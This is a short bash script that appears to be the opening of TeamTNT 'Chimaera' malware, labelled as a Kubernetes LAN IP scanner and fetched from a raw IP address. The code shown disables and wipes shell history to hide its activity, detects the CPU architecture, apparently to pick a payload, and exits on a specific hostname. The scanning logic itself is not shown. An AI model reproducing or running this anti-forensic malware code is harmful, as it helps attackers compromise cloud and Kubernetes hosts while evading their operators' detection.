#!/bin/bash
#
#	TITLE:		Chimaera_Kubernetes_scan_LAN_IPs
#	AUTOR:		hilde@teamtnt.red
#	VERSION:	Chimaera_stable_V1.00.1
#	DATE:		12.08.2021
#
#	SRC:        http://45.9.148.182/cmd/Kubernetes_scan_LAN_IPs.sh
#
########################################################################

ulimit -n 65535

export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null

if [ "$(uname -m)" = "aarch64" ]; then C_hg_SYS="aarch64"
elif [ "$(uname -m)" = "x86_64" ];  then C_hg_SYS="x86_64"
elif [ "$(uname -m)" = "i386" ];    then C_hg_SYS="i386"
else C_hg_SYS="i386"; fi



if [ "$(hostname)" = "HaXXoRsMoPPeD" ]; then exit ; fi
